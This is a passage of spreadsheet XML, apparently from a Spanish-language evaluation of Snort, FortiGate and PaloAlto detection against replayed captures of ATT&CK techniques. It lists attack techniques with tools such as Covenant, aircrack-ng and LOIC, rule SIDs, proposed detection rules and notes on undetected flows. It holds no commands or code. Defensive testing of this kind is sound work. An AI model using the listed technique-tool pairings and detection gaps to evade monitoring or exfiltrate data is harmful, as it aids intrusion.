        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2002752</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2002749</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2101620</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2044666</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2051116</t>
    </r>
  </si>
  <si>
    <t>2002752, 2101620, 2002749</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>44489</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2002752</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2002749</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2101620</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2044666</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2051116</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2002752</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2002749</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2051116</t>
    </r>
  </si>
  <si>
    <t>44489, 2101620, 2044666</t>
  </si>
  <si>
    <t>2027326, 
2027792, 2027793</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: el ataque incluye el establecimiento del canal primario además del secundario, siendo éste último el relevante para el ataque. Snort detecta ambos satisfactoriamente.</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Ataques Colaterales:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> FortiGate detecta el establecimiento del canal principal realizado con la herramienta Covenant. Sin embargo, no detecta el establecimiento del canal alternativo (basado en comunicaciones SMB). Por tanto, los correspondientes flujos no cuentan para los resultados finales</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">9999, </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF34A853"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>85585</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>, 92322</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques Colaterales:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> PaloAlto detecta el uso de Covenant como herramienta de C2 y mediante el SID 92322 detecta el establecimiento de la sesión SMB, pero no la creación del canal alternativo. Además, detecta los mensajes beacon correspondientes a Covenant . Los flujos no contarán para el calculo de la capacidad de deteccion     </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">Flujos Detectados PA: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>PaloAlto no detecta los flujos correspondientes a ICMPv6</t>
    </r>
  </si>
  <si>
    <t>Exfiltration</t>
  </si>
  <si>
    <t>TA0010</t>
  </si>
  <si>
    <t>Exfiltration Over Other Network Medium</t>
  </si>
  <si>
    <t>T1011</t>
  </si>
  <si>
    <t>Exfiltration Over Bluetooth</t>
  </si>
  <si>
    <t xml:space="preserve"> T1011.001</t>
  </si>
  <si>
    <t>Extracción via Bluetooth</t>
  </si>
  <si>
    <t>Covenant, btobex, Bluetooth</t>
  </si>
  <si>
    <t>T1011-Exfiltration_over_bluetooth_[4].pcapng</t>
  </si>
  <si>
    <t>BLUETOOTH</t>
  </si>
  <si>
    <t>Manual [4] /  3.23</t>
  </si>
  <si>
    <t>Manual [4] / B.23</t>
  </si>
  <si>
    <t>Manual [4] / 4.23</t>
  </si>
  <si>
    <t>LV2</t>
  </si>
  <si>
    <t>El uso de Bluetooth para extraer datos puede darse en contextos legítimos</t>
  </si>
  <si>
    <t>L2</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Flujos Detectados FG: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>debido al error en la reproducción de la captura no se detectan flujos</t>
    </r>
  </si>
  <si>
    <t>Discovery</t>
  </si>
  <si>
    <t>TA0007</t>
  </si>
  <si>
    <t>Remote System Discovery</t>
  </si>
  <si>
    <t>T1018</t>
  </si>
  <si>
    <t>Descubrimiento de servicios y puertos</t>
  </si>
  <si>
    <t>nmap</t>
  </si>
  <si>
    <t>T1018-service_discovery_[3].pcapng</t>
  </si>
  <si>
    <t>TCP</t>
  </si>
  <si>
    <t>Regla que detecte envío de mútliples peticiones a un rango de puertos en un tiempo determinado</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.1</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.1.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.1.5</t>
  </si>
  <si>
    <t>El descubrimiento de servicios, de forma general, se califica como ataque</t>
  </si>
  <si>
    <t>1421, 1418</t>
  </si>
  <si>
    <t>2010937, 2010935, 2010936, 2010939, 2002910, 2002911, 1421, 1418</t>
  </si>
  <si>
    <t>2010937, 2010935, 2010936, 2010939, 2002910, 2002911</t>
  </si>
  <si>
    <t>2010937, 2010935, 2010936, 2010939, 2002910, 200911, 1421, 1418</t>
  </si>
  <si>
    <t>2010937, 2010935, 2010936, 2010939, 2002910, 200911</t>
  </si>
  <si>
    <t>2010937, 2010935, 2010936, 2010939, 2002910, 2002911, 2002752, 2002749, 2101418, 2100615, 1421, 1418</t>
  </si>
  <si>
    <t>1421, 1418, 2002752, 2002749, 2101418, 2100615</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Ataques Detectados</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snort sólo dispone de reglas asociadas al escaneo de los puertos más comunes. Por esta razón, los porcentajes de detección son bastante bajos y se alejan del 100%, pues tan sólo se detecta el intento de descubrimiento de un rango minúsculo de puertos</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Detectados: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>el porcentaje de detección es bastante bajo. Esto se debe fundamentalmente a que cada puerto o servicio escaneado cuenta como un flujo con ataque distinto. Puesto que FortiGate sólo detecta los escaneos en los puertos más comunes, en global la detección se aleja del 100%</t>
    </r>
  </si>
  <si>
    <t>Automated Exfiltration</t>
  </si>
  <si>
    <t>T1020</t>
  </si>
  <si>
    <t>Traffic Duplication</t>
  </si>
  <si>
    <t>T1020.001</t>
  </si>
  <si>
    <t>Ejecución de script en Python para activar el reenvío de paquetes en el equipo víctima</t>
  </si>
  <si>
    <t>SSH, Scapy</t>
  </si>
  <si>
    <t>T1020.001-Automated_exfiltration_traffic_duplication_[4].pcapng</t>
  </si>
  <si>
    <t>Detección por anomalías en red que detecte el envío duplicado de paquetes procedentes de un mismo origen interno a la organización</t>
  </si>
  <si>
    <t>Manual [4] /  3.24</t>
  </si>
  <si>
    <t>Manual [4] / B.24</t>
  </si>
  <si>
    <t>Manual [4] / 4.24</t>
  </si>
  <si>
    <t>La ejecución de un script que habilite el reenvío de paquetes en el equipo víctima es un ataque</t>
  </si>
  <si>
    <t>402, 2044073</t>
  </si>
  <si>
    <t>2002752, 2002749, 2044073, 2100402, 402</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados FG:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> la diferencia de flujos se debe a la presencia de reseteos de conexión. No hay pérdida de información</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Flujos detectados PA</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>: PaloAlto no detecta el segundo establecimiento a SSH  duplicado</t>
    </r>
  </si>
  <si>
    <t>Lateral Movement</t>
  </si>
  <si>
    <t>TA0008</t>
  </si>
  <si>
    <t>Remote Services</t>
  </si>
  <si>
    <t>T1021</t>
  </si>
  <si>
    <t>T1021.004</t>
  </si>
  <si>
    <t>Sesión SSH</t>
  </si>
  <si>
    <t>T1021-remote_services_ssh_[3].pcapng</t>
  </si>
  <si>
    <t>Regla genérica para detectar conexiones SSH entre un orígen y un servidor o destino dentro de la red a proteger.                                                               *Este ataque, si bien es detectable por red, es idéntico a un acceso legítimo, por lo que no es posible diferenciar uno de otro (salvo por anomalías relacionadas con direcciones IP o usuarios poco comunes)</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.10</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.10.4</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.48</t>
  </si>
  <si>
    <t>El uso de SSH es genérico, no siempre tiene que tratarse de un ataque</t>
  </si>
  <si>
    <t>PaloAlto genera una alerta para SSH aunque a nivel de Aplicación tambien se detecta. Por tanto, se considera solamente en un lado la contabilización del flujo</t>
  </si>
  <si>
    <t>Scheduled Transfer</t>
  </si>
  <si>
    <t>T1029</t>
  </si>
  <si>
    <t>Comunicación C2 para el establecimiento de extracción programada</t>
  </si>
  <si>
    <t>Covenant, Powershell</t>
  </si>
  <si>
    <t>T1029-Scheduled_transfer_[4].pcapng</t>
  </si>
  <si>
    <t>HTTP</t>
  </si>
  <si>
    <t>Establecimiento del canal C&amp;C para la programación de la transferencia - Command and Control</t>
  </si>
  <si>
    <t>Detección por anomalías, basada en el descubrimiento de eventos programados que no han sido creados por el usuario.</t>
  </si>
  <si>
    <t>Manual [4] /  3.25</t>
  </si>
  <si>
    <t>Manual [4] / B.25</t>
  </si>
  <si>
    <t>Manual [4] / 4.25</t>
  </si>
  <si>
    <t>La programación de una exfiltración de datos es siempre un ataque</t>
  </si>
  <si>
    <t>2027792, 2027793, 1917</t>
  </si>
  <si>
    <t>2027792, 2027793</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF6AA84F"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027792, 2027793</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 2002752, 2002749, 2101917, 1917</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF6AA84F"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027792, 2027793</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 2002752, 2002749, 2101917, 1917</t>
    </r>
  </si>
  <si>
    <t>2002752, 2002749, 2101917, 1917</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Ataques Colaterales:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> FortiGate detecta el establecimiento del canal C&amp;C, pero no detecta la programación de la extracción como tal. Por ello, sólo puede considerarse que FortiGate detecta adecuadamente el ataque colateral pero no el principal.                                                        </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados FG</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: dos flujos con protocolo BROWSER (Windows) no son detectados. Estos flujos son irrelevantes para el ataques</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF34A853"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>9999</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF34A853"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>85585</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>, 94634</t>
    </r>
  </si>
  <si>
    <t>9999, 85585</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques Colaterales:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> PaloAlto detecta el uso de Covenant como herramienta de C2. Además, detecta los mensajes beacon correspondientes a Covenant . Los flujos no contarán para el calculo de la capacidad de deteccion porque no detecta la transferencia programada    </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">Flujos Detectados PA: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>PaloAlto no detecta los flujos correspondientes al protocolo BROWSER, SSDP</t>
    </r>
  </si>
  <si>
    <t>Data Transfer Size Limits</t>
  </si>
  <si>
    <t>T1030</t>
  </si>
  <si>
    <t>Dividir archivos para realizar transferencias menores a un umbral que provoque alertas</t>
  </si>
  <si>
    <t>ftp, split</t>
  </si>
  <si>
    <t>T1030-Transfer_Size_Limits_[5].pcapng</t>
  </si>
  <si>
    <t>FTP</t>
  </si>
  <si>
    <t>En el proceso de ataque se hace uso de un Shell Remoto, pero no es la función principal</t>
  </si>
  <si>
    <t>NO**</t>
  </si>
  <si>
    <t>Transferencia de ficheros mediante FTP, previamente divididos en paquetes de un tamaño constante</t>
  </si>
  <si>
    <t>Manual [5] /  4.9.1</t>
  </si>
  <si>
    <t>Manual [5] / C.1</t>
  </si>
  <si>
    <t>Manual [5] /  5.12.5</t>
  </si>
  <si>
    <t>La división en partes para la transferencia de un fichero no necesariamente es un ataque</t>
  </si>
  <si>
    <t>2002752, 2002749, 2000418, 2011803, 2003303, 2003410, 2015016, 2036752</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Flujos detectados PA</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>:  PaloAlto no detecta flujos correspondientes al protocolo MDNS</t>
    </r>
  </si>
  <si>
    <t>System Owner</t>
  </si>
  <si>
    <t>T1033</t>
  </si>
  <si>
    <t>Descubrimiento de sesión de usuario en equipo remoto</t>
  </si>
  <si>
    <t>quser, qwinsta</t>
  </si>
  <si>
    <t>T1033-System_owner_[4].pcapng</t>
  </si>
  <si>
    <t>Regla que detecte múltiples interacciones con la API LSM_API_service del servicio RPC desde el mismo equipo origen.</t>
  </si>
  <si>
    <t>Manual [4] /  3.12</t>
  </si>
  <si>
    <t>Manual [4] / B.12</t>
  </si>
  <si>
    <t>Manual [4] / 4.12</t>
  </si>
  <si>
    <t>El descubrimiento de sesión del usuario en un equipo remoto puede tratarse de una actividad legítima en ciertos contextos</t>
  </si>
  <si>
    <t>44489, 2002752, 2002749, 2044666, 2051116</t>
  </si>
  <si>
    <t>2002749, 2002752</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados FG:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> FortiGate no identifica los flujos con direcciones IPv6, causando esta variación en los resultados</t>
    </r>
  </si>
  <si>
    <t>92322, 33836</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Flujos detectados PA</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">: Paloalto no detecta tráfico de los protocolos MDNS y LLMNR </t>
    </r>
  </si>
  <si>
    <t>Collection</t>
  </si>
  <si>
    <t>TA0009</t>
  </si>
  <si>
    <t>Data from Network Shared Drive</t>
  </si>
  <si>
    <t>T1039</t>
  </si>
  <si>
    <t>Descarga de archivos de interés disponibles en una red compartida</t>
  </si>
  <si>
    <t>Comando Net Use</t>
  </si>
  <si>
    <t>T1039-Data_from_network_shared_drive_[4].pcapng</t>
  </si>
  <si>
    <t>Detección por anomalías, copia repentina de ficheros compartidos por red.</t>
  </si>
  <si>
    <t>Manual [4] /  3.15</t>
  </si>
  <si>
    <t>Manual [4] / B.15</t>
  </si>
  <si>
    <t>Manual [4] / 4.15</t>
  </si>
  <si>
    <t>La extracción de datos de un disco compartido es legítimo en según qué contextos</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>44489, 2002752, 2002749, 2044666</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2051116</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>44489, 2002752, 2002749, 2044666</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2051116</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>44489, 2002752, 2002749, 2044666</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2051116</t>
    </r>
  </si>
  <si>
    <t>FTP - File Sharing</t>
  </si>
  <si>
    <t>1</t>
  </si>
  <si>
    <t>Network Sniffing</t>
  </si>
  <si>
    <t>T1040</t>
  </si>
  <si>
    <t>Falsa autenticación</t>
  </si>
  <si>
    <t>Suite aircrack-ng</t>
  </si>
  <si>
    <t>T1040-Autenticacion_[1].pcapng</t>
  </si>
  <si>
    <t>802.11</t>
  </si>
  <si>
    <t>No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.</t>
  </si>
  <si>
    <t>Manual [1] /  4.2.1</t>
  </si>
  <si>
    <t>Manual [1] / E.20</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.26</t>
  </si>
  <si>
    <t>NO (Ataque de L2)</t>
  </si>
  <si>
    <t>SI (paquetes con tamaño 0)</t>
  </si>
  <si>
    <t>El acceso vía falsa autenticación siempre es un ataque</t>
  </si>
  <si>
    <t>L2 (WEP)</t>
  </si>
  <si>
    <t>Error TCPReplay. No se puede analizar el fichero</t>
  </si>
  <si>
    <t>ChopChop</t>
  </si>
  <si>
    <t>T1040-Chopchop_[1].pcapng</t>
  </si>
  <si>
    <t>Manual [1] /  4.2.2</t>
  </si>
  <si>
    <t>Manual [1] / E.21</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.27</t>
  </si>
  <si>
    <t>El uso de la técnica ChopChop siempre es un ataque</t>
  </si>
  <si>
    <t>Fragmentación</t>
  </si>
  <si>
    <t>T1040-Fragmentacion_[1].pcapng</t>
  </si>
  <si>
    <t>Manual [1] /  4.2.3</t>
  </si>
  <si>
    <t>Manual [1] / E.22</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.28</t>
  </si>
  <si>
    <t>El uso de la técnica Fragmentacion siempre es un ataque</t>
  </si>
  <si>
    <t>Inundación MAC</t>
  </si>
  <si>
    <t>T1040-Mac_flood_[1].pcapng</t>
  </si>
  <si>
    <t>IPv4</t>
  </si>
  <si>
    <t>NO*</t>
  </si>
  <si>
    <t>Regla personalizada que detecte un envío masivo de mensajes IPv4 con direcciones incorreladas con la red a proteger, y que aparenten ser completamente aleatorias</t>
  </si>
  <si>
    <t>Manual [1] /  3.2</t>
  </si>
  <si>
    <t>Manual [1] / E.1</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.29</t>
  </si>
  <si>
    <t>Una inundacion MAC siempre es un ataque</t>
  </si>
  <si>
    <t>L2 (Switch)</t>
  </si>
  <si>
    <t>2013028, 50447</t>
  </si>
  <si>
    <t>50447, 2002749, 2100528, 2002752, 2013028, 2002824</t>
  </si>
  <si>
    <t>50447, 2100528, 2013028, 2002824</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv3 y tranalyzer cuentan los flujos IPv4 como flujos válidos, no así Snortv2, que no los analiza. Snortv2 tan sólo analiza un flujo TCP suelto en la captura. Esto sí puede afectar a los resultados.</t>
    </r>
  </si>
  <si>
    <t>Exfiltration Over C2 Channel</t>
  </si>
  <si>
    <t>T1041</t>
  </si>
  <si>
    <t>Exfiltración por canal C2</t>
  </si>
  <si>
    <t>Caldera</t>
  </si>
  <si>
    <t>T1041-exfiltration_over_c2_channel_[3].pcapng</t>
  </si>
  <si>
    <t>Detección por anomalías basada en la sospecha de una extracción de información confidencial por un posible canal C2</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.14</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.14.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.14.5</t>
  </si>
  <si>
    <t>La exfiltración de datos por un canal C2 siempre es un ataque</t>
  </si>
  <si>
    <t>2043217, 2034567, 2013028, 2016992</t>
  </si>
  <si>
    <t>2034567, 2013028, 2016992</t>
  </si>
  <si>
    <t>50447, 2043217, 2034567, 2013028, 2016992</t>
  </si>
  <si>
    <t>50447, 2034567, 2013028, 2016992</t>
  </si>
  <si>
    <t>2002752, 2002749, 2006409, 2043217, 2034567, 2013028, 2016992, 2002824, 50447</t>
  </si>
  <si>
    <t>2002752, 2002749, 2006409, 2034567, 2013028, 2016992, 2002824, 50447</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Flujos Detectados FG: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">hay un flujo que FortiGate no detecta. No hay causa aparente </t>
    </r>
  </si>
  <si>
    <t>Web Browsing - Able to transfer file</t>
  </si>
  <si>
    <t>Network Service Discovery</t>
  </si>
  <si>
    <t>T1046</t>
  </si>
  <si>
    <t>Mútliples actividades de escaneo, incluidas el intento de Shell Remoto aprovechando el conocimiento de la red victima</t>
  </si>
  <si>
    <t>Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests</t>
  </si>
  <si>
    <t>T1046-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>Shell Remoto - T1071</t>
  </si>
  <si>
    <t>En determinadas circunstancias, si el envío de paquetes constituye una amenaza de denegación de servicio, podría detectarse el envío masivo de paquetes</t>
  </si>
  <si>
    <t>Dataset CIC-2018</t>
  </si>
  <si>
    <t>Manual [4] / B.31</t>
  </si>
  <si>
    <t>Las actividades de escaneo son ataques</t>
  </si>
  <si>
    <t>2035480, 2025644</t>
  </si>
  <si>
    <t>2035480, 2025644, 44728</t>
  </si>
  <si>
    <t>2002749, 2002752, 2035480, 2000419, 2025644, 44728</t>
  </si>
  <si>
    <t>2035480, 2000419, 2025644, 44728</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
